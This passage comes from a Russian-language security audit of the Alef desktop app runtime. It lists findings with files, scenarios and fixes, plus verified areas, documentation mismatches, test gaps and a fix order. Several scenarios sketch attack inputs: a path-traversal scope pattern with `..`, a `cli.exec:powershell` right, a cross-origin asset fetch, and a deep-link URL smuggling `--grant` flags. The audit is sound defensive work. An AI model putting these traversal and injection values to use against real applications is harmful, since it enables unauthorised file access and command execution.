- **Как убедился:** чтение `risk`, `reaches_everything`, `PathPattern::parse`; тест `a_right_that_reaches_everything_is_risky_and_one_that_says_what_it_reaches_is_not` проверяет только перечисленные строки.
- **Сценарий:** приложение просит `fs.write:$DOCUMENTS/../**` и `cli.exec:powershell`; пользователь видит две «обычные» строки без ⚠, жмёт «Allow all» (одна кнопка без подтверждения) — у приложения запись во весь домашний каталог и произвольные команды.
- **Исправление:** классифицировать после разбора: канонический `base` сравнивать с канонизированными `$HOME`/корнями дисков/родителями `$HOME` (`base` — предок или равен `$HOME` ⇒ риск); запретить `..` в шаблонах scope вовсе (проще и честнее); для `cli.exec` — список оболочек и интерпретаторов как рискованных; в окне согласия показывать раскрытый путь.
- **Уверенность:** подтверждено чтением.

#### R-025. CI проверяет e2e только на Linux и только отладочную сборку: всё, что зависит от Windows и macOS (реестр, именованный канал, `cmd.exe`, диалоги, тихий режим), и релизный профиль в CI не исполняются
- **Файл:** `.github/workflows/ci.yml:186-193` (шаг e2e с `if: runner.os == 'Linux'`), `:176-183` (только `build:rust`/`build`, debug), `:195-200` (артефакт — `target/debug`)
- **Что не так:** на `windows-latest`, `macos-14`, `macos-15-intel` идут только `cargo test`, тесты API и сборка; сценарии `tests/e2e` — только на `ubuntu-24.04` под `xvfb`. Код с наибольшим риском (R-011 `cmd.exe`, R-015 реестр, R-016 канал, R-019 диалоги, R-023 команда deep link) живёт в `#[cfg(windows)]`-ветках и в e2e, которые на Windows запускаются только вручную (а `autostart`/`deeplink` — ещё и с `ALEF_E2E_APP_INTEGRATION=1`). Релизный профиль не собирается нигде — то, что в него попадает (например, R-018), не видно. `docs/stages/m5-integration.md` («Как сделано», последний пункт) честно пишет, что ветки Linux/macOS локально не запускались, — но и в CI их e2e не запускаются.
- **Исправление:** e2e на `windows-latest` (тихий режим уже есть; Servo на WARP/Mesa — проверить) хотя бы для `core`, `permissions`, `window`, `cli`, `app`; macOS — `core`/`permissions`; отдельная задача `cargo build --release` + `strings`-проверка отсутствия `e2e.*`.
- **Уверенность:** подтверждено чтением CI.

#### R-026. Сам e2e закрепляет уязвимую команду deep link и проверяет «права» тестовыми командами
- **Файл:** `tests/e2e/scenarios/app/app-integration.mjs:73, 97` (`value.command === \`${j.win} "%1"\``); `tests/e2e/apps/permissions/page.js:3, 22-46`; `tests/e2e/lib.mjs:108, 114-117`
- **Что не так:** (1) сценарий `deeplink` требует, чтобы в реестре была ровно команда без `--` (R-023) — исправление уязвимости уронит тест, а сам тест не проверяет ни одной попытки инъекции. (2) Сценарий `permissions` доказывает работу диспетчера на командах `e2e.fsRead/fsWrite/appEnv` (их scope — произвольная строка `target`), а не на настоящих `fs.*`; это полезно, но не то же самое (модульные сценарии `fs` это частично покрывают). (3) Все прогоны идут с `ALEF_E2E_CONSENT='*=allow'` и притворными бэкендами (`lib.mjs:108`), так что «зелёный e2e» почти никогда не включает настоящее окно согласия, настоящие диалоги и настоящий `shell`/уведомления.
- **Исправление:** в `deeplink` — проверка, что URL с `"` и `--grant` не меняет решений и папку приложения; ожидаемая команда — с `"--" "%1"`; в отчётах e2e явно разделять «настоящий бэкенд» и «притворный».
- **Уверенность:** подтверждено чтением.

### Мелко

#### R-006. Ассеты `native://app/*` (включая `alef.ktav` и любые файлы каталога приложения) отдаются с `Access-Control-Allow-Origin: *`
- **Файл:** `backend/crates/alef-runtime/src/bridge/mod.rs:413-441`; `backend/crates/alef/src/plan.rs:72` (`assets: app_dir`)
- **Что не так:** `apply_headers` ставит `ACAO: *`, `Allow-Methods: POST, OPTIONS`, `Allow-Headers: authorization` на ответы с файлами приложения — это заголовки старого транспорта, транспорт теперь ставит свои (`transport/http.rs:193-201`). Каталог ассетов = каталог приложения целиком (манифест, исходники, `.env`, что угодно рядом).
- **Сценарий:** фрейм из `external.load.frames` (чужой origin) делает `fetch('native://app/alef.ktav')` и читает его благодаря `*`. Утечка структуры приложения, не секретов рантайма.
- **Исправление:** убрать CORS-заголовки с ассетов; отдавать только подкаталог ассетов, не корень приложения (или явный список).
- **Уверенность:** подтверждено чтением заголовков; читаемость из чужого фрейма в Servo — правдоподобно.

#### R-007. Редирект в scope, который пользователь «подменил», выдаёт подмену ошибкой `PERMISSION_DENIED`
- **Файл:** `backend/crates/alef-modules/src/net/http/mod.rs:85-97`
- **Что не так:** `authorizer` на каждом хопе превращает `Decision::Substitute` в `PERMISSION_DENIED` «the address is outside what the application may reach», тогда как первый адрес с тем же решением «висит до таймаута» (`dead`). Приложение различает решения по форме ошибки, вопреки §6.4 («нет кода ошибки»).
- **Исправление:** при `Substitute` на хопе — вести себя как `dead` (ждать таймаут и вернуть `TIMEOUT`).
- **Уверенность:** подтверждено чтением.

#### R-008. `fs.tempFile`/`fs.tempDir` создают файлы в `$APPCACHE/tmp` навсегда
- **Файл:** `backend/crates/alef-modules/src/data/fs/mod.rs:305-333`
- **Что не так:** `.keep()` отвязывает временный файл/каталог от `tempfile`, грант даётся сессии, но ни закрытие сессии, ни старт рантайма ничего не удаляют. Документация (`FRAMEWORK-PLAN.md` §7 `fs`: «temp») не оговаривает, что это ответственность приложения.
- **Исправление:** удалять при закрытии сессии (ресурс сессии с `close`) или чистить `tmp` при старте; записать правило в документацию API.
- **Уверенность:** подтверждено чтением.

#### R-009. `fs.settle` на handle с читающей помпой молча прерывает её
- **Файл:** `backend/crates/alef-modules/src/data/fs/handle.rs:417-429`
- **Что не так:** `Some(Pump::Read(task)) => task.abort()` — читающий поток получает `Error(CLOSED)`, хотя команда описана как «дождаться записи». Ошибка вызывающего превращается в тихую потерю данных у читателя.
- **Исправление:** `INVALID_ARGUMENT`/no-op для читающей помпы.
- **Уверенность:** подтверждено чтением.

#### R-020. `shortcut.register` выдаёт подмену: при `Substitute` ответ содержит `token: null`, а публичный JS-тип это поле показывает
- **Файл:** `backend/crates/alef-modules/src/desktop/ui/shortcut.rs:128-168`; `packages/api/src/desktop/shortcut.ts:12, 19-36`
- **Что не так:** при `Decision::Substitute` нативной регистрации нет и `token = None` → `json!({"token": token.map(..)})` = `null`; при «разрешить» — число. Поле `token: number | null` есть в публичном типе ответа, а класс ярлыка при `null` просто не подписывается. Приложение отличает «подменено» от «разрешено» одной проверкой, вопреки §6.4 (подмена не должна различаться). Та же категория, что R-007.
- **Исправление:** при подмене выдавать фиктивный токен из того же диапазона (и никогда не присылать событий), токен не делать частью публичного типа.
- **Уверенность:** подтверждено чтением.

#### R-021. Номера глобальных ярлыков не переиспользуются и кончаются за жизнь процесса: после 49 151 регистрации `shortcut.register` навсегда отвечает ошибкой
- **Файл:** `backend/crates/alef-runtime/src/ui/integration/shortcut.rs:109-118`
- **Что не так:** `self.next` растёт на каждую успешную регистрацию до `0xBFFF` (диапазон id `RegisterHotKey`), отпущенные номера не возвращаются (сознательно — «queued events cannot target a new registration»). Перезагрузка документа, регистрирующего ярлыки при старте, или цикл register/unregister исчерпывает пространство; дальше — `Other("Shortcut token space exhausted")` до перезапуска процесса.
- **Сценарий:** долгоживущее приложение в трее с горячей перезагрузкой в разработке или страница, перерегистрирующая ярлык при смене настроек: через N дней ярлыки перестают работать без понятной причины.
- **Исправление:** переиспользовать номера после того, как `unregister` завершён и очередь событий выбрана (поколение в старших битах токена, а нативный id — из свободного пула), либо хотя бы документировать предел.
- **Уверенность:** подтверждено чтением.

#### R-022. Ошибка одного окна завершает всё приложение: `drag_resize_window` при нажатии на край окна без рамки, сбой `SystemParametersInfoW` при прокрутке, несовпадение поверхности Servo
- **Файл:** `backend/crates/alef-runtime/src/window/app.rs:227-241, 265-283, 161-169`; `backend/crates/alef-runtime/src/window/platform/linux.rs:8`
- **Что не так:** в обработчике событий окна любая ошибка → `self.error = Some(..); event_loop.exit()`. На Linux `SUPPORTS_NATIVE_RESIZE = true`, и нажатие левой кнопки на краю окна без рамки вызывает `state.window.drag_resize_window(edge)`; любая ошибка winit здесь (`NotSupported` на платформе/бэкенде без этой операции, ошибка X-сервера) закрывает приложение от клика пользователя. Тот же исход для `wheel_scroll_units` (Windows) и `synchronize_viewport`.
- **Исправление:** ошибки ввода и жестов — в лог и игнорировать (или отключать hit-test краёв после первой ошибки); завершать приложение только при потере GL-контекста.
- **Уверенность:** подтверждено чтением (выход по любой ошибке); при каких оконных менеджерах/бэкендах winit действительно возвращает ошибку — нужна проверка запуском.

#### R-027. Цепочка поставки CI и патчи: действия по плавающим тегам, плавающий `stable`, нет аудита зависимостей, патчи — полные копии крейтов без описи изменений
- **Файл:** `.github/workflows/ci.yml:59-91, 104-129`; `backend/Cargo.toml:9-13`; `backend/patches/{winit,surfman,servo-paint,servo-paint-api}`
- **Что не так:** (1) `actions/checkout@v4`, `dtolnay/rust-toolchain@stable`, `mozilla-actions/sccache-action@v0.0.7`, `ilammy/msvc-dev-cmd@v1` — теги, не SHA; `rust-toolchain@stable` даёт каждый раз новый компилятор, а заявленный MSRV `1.88` (`rust-version` во всех крейтах) не проверяется ни одной задачей; `choco install llvm cmake ninja`, `brew install`, `apt-get install` — без версий. (2) Нет `cargo audit`/`cargo deny` (уязвимости, лицензии, дубликаты) — при том что все зависимости закреплены `=x.y.z` и сами не обновятся. (3) `[patch.crates-io]` подменяет 4 крейта полными копиями (215 файлов winit, 91 surfman, 20+9 servo-paint*); что именно изменено, записано только для surfman (`m2-desktop.md:212`) и частично в `m0-results/ci.md`; для winit README — исходный апстримный, комментариев «Alef patch» в коде winit нет. Обновление Servo/winit потребует заново восстанавливать дифф. (4) `ALEF_CARGO_JOBS` в CI по собственному комментарию «ни на что не влияет» (`scripts/cargo.mjs:8` жёстко `--jobs 1`).
- **Исправление:** закрепить действия по SHA, добавить задачу с `toolchain: 1.88`; `cargo deny check` в CI; хранить патчи как `.patch`-файлы против закреплённой версии (или хотя бы `PATCHES.md` с перечнем изменённых файлов и причин) и проверку, что копия = апстрим + патч; убрать мёртвую переменную.
- **Уверенность:** подтверждено чтением.

## Проверено и в порядке

- **Канонизация путей (`security/scope/path.rs`)**: `..` применяется к уже разрешённому префиксу (симлинк, пройденный до `..`, учитывается), висячая ссылка и нечитаемый компонент — отказ, `\\.\` (DeviceNS) — отказ, Windows-имена устройств/алиасы (`CON`, `NUL`, `COM1`, хвостовые `.`/` `, `:`-потоки) — отказ по входным компонентам; verbatim-префикс снимается только в конце. Регистр — по ОС (`CASE_INSENSITIVE`), сравнение после `canonicalize` обеих сторон.
- **Scope-шаблоны**: `$VAR` только первым сегментом, значение переменной литерально (glob-символы в пути пользователя scope не расширяют); `..` после `*` — ошибка манифеста; `**` только целым компонентом.
- **Гранты диалогов (`given/grants.rs`)**: каталог — поддерево, файл — только он; канонизируются; чтение и запись раздельно.
- **`with_protected(runtime_home)`** выводит каталог решений из-под любого права и гранта (`permissions.rs:324-329, 553-555`).
- **URL-scope (`scope/net.rs`)**: строгий разбор кандидата (ASCII, без userinfo, без `%2e/%2f/%5c`, без `.`/`..` сегментов, порт 1..65535), хост нормализуется, `*.suffix` требует точку в суффиксе и не матчит сам суффикс.
- **Редиректы `http.request`**: каждый хоп заново через `permissions.check`, `Authorization`/`Cookie` снимаются при смене origin, не-HTTP `Location` — ошибка, лимит 10.
- **Guard `http.serve` (`server/guard.rs`)**: `Host` обязателен и должен быть именем сервера (loopback → `localhost`/loopback-IP; `0.0.0.0` → любой IP-литерал, но не имя), `Origin` — origin сервера или из списка, два `Origin` — отказ. Это закрывает DNS-rebinding и CSRF из браузера.
- **Статика `http.serve({files})`**: сегменты декодируются сами, `..`, `%2e`, `\`, `:`, NUL, хвостовые `.`/` ` — отказ; `canonicalize` + `starts_with(root)` + повторная проверка `fs.read` на каждый файл.
- **Транспорт**: один и тот же 403 на любой отказ аутентификации; bootstrap-токен только для `runtime.hello`; сессия привязана к окну и документу (`session_for_document` атомарен, более старый pipeline не может вернуть сессию); `CallGuard` отменяет обработчик при обрыве fetch; `Terminal` гарантирует `Done`/`Cancelled` для Servo; панику обработчика превращает в 500 без текста.
- **`CreditGate::acquire`**: `enable()` до проверки `closed` — потерянного пробуждения нет (есть вероятностный тест на 300 раундов).
- **Согласие**: `validate` требует ровно все права по одному разу, рискованное «разрешить» — только с подтверждением; обмен запрос/ответ — в `runtime_home()/ask`, не в общем `/tmp`; `enforce` сверяет `PermissionSet` с решениями при старте; `narrow` применяет только сужение.
- **Манифест**: `deny_unknown_fields`, обязательные `external`/`permissions`, дубликаты label/scheme/command, `console`/`entry` только при `windows: []`.
- **Объявленные команды**: программа и шаблон из манифеста, `{param}` только целым элементом, NUL в значении — отказ, лишний параметр — отказ.
- **Кодек кадров (`protocol/frame.rs`)**: длина проверяется до выделения памяти (`with_capacity(min(len, 64 KiB))`), неизвестный тип и непустой `End` — ошибка, декодер «отравляется» навсегда; тесты на каждую точку разреза и побайтовую подачу.
- **Окна (`window/host/manage.rs`)**: второе окно открывает только путь того же scheme/host/port (`url_for`), `WindowDef::check` отвергает `//host` и `\`; `closeIntercept`/`closeAnswer` — только своё окно и только текущий документ окна (сверка сессии); ответ на закрытие ограничен 3 с; навигация документа — только `native://app` (или origin dev-сервера) в `Delegate::request_navigation`.
- **Глобальные ярлыки**: владелец — пара (окно, сессия), события идут только этой сессии (`publish_session`), ярлыки окна снимаются при его закрытии и по таймеру при смене документа, регистрация после закрытия таблицы ресурсов откатывается (`ResourceTable::insert` → `Closed` → `unregister`), на shutdown отпускаются все.
- **Сброс файлов (`drops.rs`)**: грант чтения только документу окна, на которое бросили, только существующим путям, не больше 500; новый документ того же окна грантов не наследует (тест).
- **Шина событий (`bridge/events.rs`)**: публикация никогда не ждёт страницу; медленный подписчик снимается с `BUSY`; адресные события сессии не попадают другому документу того же окна.
- **Страница согласия (`assets/consent`)**: всё из манифеста вставляется только через `textContent`; «Start» недоступна, пока не решено каждое право и не подтверждено каждое рискованное «разрешить»; сервер (`consent::ask::validate`) повторяет обе проверки и не принимает лишних/повторных ответов; команды `runtime.consent.*` есть только в процессе `alef consent`.
- **Ошибки `fs` (`fs/fault.rs`)**: приложение получает код и наш текст, без системного сообщения (в нём бывает путь); блокировки Windows (32/33) → `BUSY`.
- **SQLite-значения (`sqlite/values.rs`)**: целые вне 2^53 — тегом `$int`, BLOB — `$blob`, бесконечности — `$real`; параметры — только значения или один тег, массив/лишний ключ — отказ.
- **JS-клиент (`packages/api/src/core`)**: токен сессии не выдаётся коду приложения (модульная переменная), рукопожатие одно на документ и не запоминает неудачу, кадры потока ограничены 16 MiB, ack пачками по 256 KiB и при закрытии; `call` с отменой через `AbortSignal`; события: одна подписка на документ, переподписка после `BUSY`, исключение обработчика не ломает остальные.
- **MCP (`packages/mcp`)**: HTTP только на loopback, проверка `Host` и `Origin` (поверх guard рантайма), случайный bearer-токен 32 байта по умолчанию, ограничения тела (1 MiB) и числа сессий (128), сессия создаётся только успешным `initialize`; ошибки обработчика наружу — «Internal error.» без текста; stdio — построчный JSON с лимитом размера. Замечание без отдельной находки: токен сравнивается `!==` (не за постоянное время) — на loopback практически неэксплуатируемо; простаивающие сессии не истекают (только `DELETE`).
- **Структура**: `node scripts/check-structure.mjs` — «Structure OK: <= 7 entries per directory, <= 700 lines per file».
- **Зависимости**: все прямые зависимости крейтов закреплены точной версией (`=x.y.z`), `--locked` в сборке и тестах CI; `spike-integration` (tray/menu спайка) — за cargo-feature, по умолчанию выключен.
- **Запоминание окон (`state/restore.rs`)**: недоверие к файлу (`sane`: конечные числа < 10^6), запись через `.part` + `rename`, позиция восстанавливается только если окно достижимо (`geometry::reachable`).

## Расхождения документации с кодом

- **Подмена «неотличима» (`FRAMEWORK-PLAN.md` §6.4, таблица подмен: `shortcut.global` — «регистрация „успешна“, но не срабатывает»)** — в коде её выдают `token: null` у ярлыка (R-020), `PERMISSION_DENIED` на редиректе (R-007), `BUSY` несвязанных команд при «висящих» подменённых вызовах (R-013).
- **«Программу и аргументы задаёт манифест» (`FRAMEWORK-PLAN.md` §6.4, `m4-net-cli.md`, M4.5c)** — страница задаёт окружение (R-010) и может подставить опцию вместо значения (R-012).
- **`docs/stages/m1-core.md:163`: «открывать без следования ссылкам, где возможно»** — модуль `fs` этого не делает (R-004).
- **`shell.openPath` «никогда не запускает программ» (`m2-desktop.md`, docstring модуля)** — неполный denylist (R-017).
- **`desktop/app/instance.rs:1-6`: «только пользователь, владеющий endpoint, может достучаться»** — верно для Unix, не для Windows (R-016).
- **`APP-RUNTIME.md` §7** предупреждает о вызове инструментов локальным клиентом, но не об исчерпании общего лимита ресурсов (R-005); спул вывода `cli.pty` на диск и вечные `fs.tempFile` не описаны (R-014, R-008).
- **`m1-core.md:157`: «команды `e2e.*` … существуют только при `ALEF_E2E=1`»** — верно, но умалчивает, что это переменная окружения в релизном бинарнике, а не сборочный флаг (R-018).
- **`m5-integration.md`, «Как сделано (M5.1)»: «лаунчер берёт из командной строки за адрес только то, что разбирается как URL…, остальные слова остаются аргументами приложения»** — `alef/src/args.rs` отвергает любое слово, не являющееся флагом или URL, если оно не после `--` («unknown argument»; тест `trailing_urls_belong_to_the_application_but_unknown_options_and_strays_do_not`), и продолжает разбирать флаги рантайма после URL (R-023).
- **План против состояния:** `FRAMEWORK-PLAN.md` §6.3 и `m5-integration.md:61` — регистрации «указывают на `alef run <пакет>`»; в коде регистрируется `alef --app <папка>`, `alef run` нет (это M7, раздел «Как сделано» об этом честен).
- **`.github/workflows/ci.yml:21-25`** — переменная `ALEF_CARGO_JOBS` по собственному комментарию ни на что не влияет.

## Пробелы тестов

- Нет теста, что `cli.run`/`cli.start` отвергают `env` от страницы и значения `{param}`, начинающиеся с `-` (R-010, R-012).
- Нет теста на UNC/`\\?\`/`\\.\` в `defaultPath` (R-019); тест `a_start_path_must_be_absolute_and_plain` проверяет только относительный путь, пустую строку и NUL.
- `Right::risk()` проверяется только на перечисленных строках; нет тестов с `..`, `./`, абсолютным путём домашнего каталога, оболочками в `cli.exec` (R-024).
- Сценарий `deeplink` закрепляет команду без `--` и не пробует инъекцию (R-023, R-026); нет теста `parse_args` с флагами рантайма после URL.
- Нет теста ограниченности таблиц потоков и ресурсов после многих открытий/закрытий (R-001, R-002) и лимита соединений `http.serve` (R-005).
- Тест двойного `readStream` проверяет только `BUSY`, не целостность данных первого потока (R-003).
- Нет теста неразличимости подмены по форме ответа: ярлык, редирект, `BUSY` (R-007, R-013, R-020).
- Нет теста путей ошибок UI-потока (ошибка `drag_resize_window`, прокрутки) — сейчас они завершают приложение (R-022).
- CI: e2e только на Linux; Windows-ветки (реестр, канал, `cmd.exe`, диалоги) и macOS проверяются только вручную; релизный профиль не собирается (R-025).
- e2e почти всегда идут с `ALEF_E2E_CONSENT='*=allow'`, притворными бэкендами и скриптом диалогов; в тихом режиме (Windows/macOS) видимость, фокус, maximize/minimize и fullscreen — собственный учёт рантайма. «Зелёный e2e» не доказывает работу настоящих диалогов, `shell`, уведомлений и показа окна (последнее честно записано в `APP-RUNTIME.md`).
- Сценарий `permissions` доказывает диспетчер на тестовых командах `e2e.*`, а не на настоящих модулях (R-026).

## Меню (в процессе)

Код в worktree `m5-mn` (изменения проиндексированы, не закоммичены, не влиты); `muda =0.19.3`; Windows и macOS (на macOS — только меню приложения), Linux — `NOT_AVAILABLE`. Общее впечатление: та же дисциплина, что у ярлыков — владелец (окно, сессия), освобождение по владельцу, ресурс сессии с откатом при `Closed`, события только владельцу (`publish_session`), лимиты дерева (256 узлов, 8 уровней, уникальные id), `deny_unknown_fields`, проверка ответа хоста на `popup` (id должен быть активным пунктом). Замечания для доводки, без драматизации:
- `menu.setWindowMenu({label})` позволяет документу одного окна повесить меню на другое окно приложения; владельцем остаётся вызывающий, документ целевого окна снять это меню не может, клики уходят первому. Решить, нужно ли это, и записать.
- `popup` выполняется синхронно в модальном цикле `TrackPopupMenu` на UI-потоке, затем `chosen` ждёт событие до 500 мс (только когда пункт выбран); события других меню, пришедшие в это окно, отбрасываются (`model.rs:256-263`).
- `execute` содержит `unreachable!()` для `MenuCall::Release` (`ui/menu.rs:140`) — паника в рабочем пути при будущей правке; лучше вернуть ошибку.
- Подписи пунктов от страницы уходят в Win32 как есть: `&` станет мнемоникой — экранировать или документировать.
- Подмена для `menu` не предусмотрена (права нет) — согласовано с планом.

## Рекомендованный порядок исправления

1. **R-023 + R-026** — `"--" "%1"` в команде deep link, запрет флагов рантайма после URL и повторного `--app`, тест на инъекцию. Малая правка, наибольший эффект.
2. **R-018** — вынести `e2e.*`, сценарии согласия/диалогов, притворные бэкенды и `spikes::origin` за cargo-features; релизная сборка без них (и проверка в CI).
3. **R-010, R-012** — объявленные команды без `env` от страницы (или только объявленные в манифесте переменные), значения `{param}` без ведущего `-` или с `pattern`.
4. **R-024** — классификация риска после канонизации, запрет `..` в шаблонах scope, оболочки/интерпретаторы в `cli.exec` — рискованные; показывать раскрытый путь в окне согласия.
5. **R-019** — отвергать UNC/устройства в `defaultPath`, не звать `is_dir()` на непроверенном пути.
6. **R-011, R-015, R-016, R-017** — граница с Windows: резолв первого слова для `shell`, проверка HKCR и рискованность `app.deepLinks`, DACL и SID в имени канала, ассоциации вместо denylist.
7. **R-001, R-002, R-005, R-013** — ограниченность таблиц сессии, отдельный лимит `http.serve`, `runtime.*` вне общего семафора и таймаут `websocket.send`.
8. **R-003, R-009, R-004** — корректность `fs`: резерв помпы до `spawn`, `settle` не трогает чтение, проверка открытого дескриптора против авторизованного пути.
9. **R-025, R-027** — e2e на Windows (и минимум на macOS), релизная сборка в CI, `cargo deny`, действия по SHA, задача на MSRV, опись патчей.
10. **R-007, R-020, R-014, R-008, R-006, R-021, R-022** — утечки подмены, спул `pty`, временные файлы, CORS ассетов, номера ярлыков, выход приложения по ошибке окна.
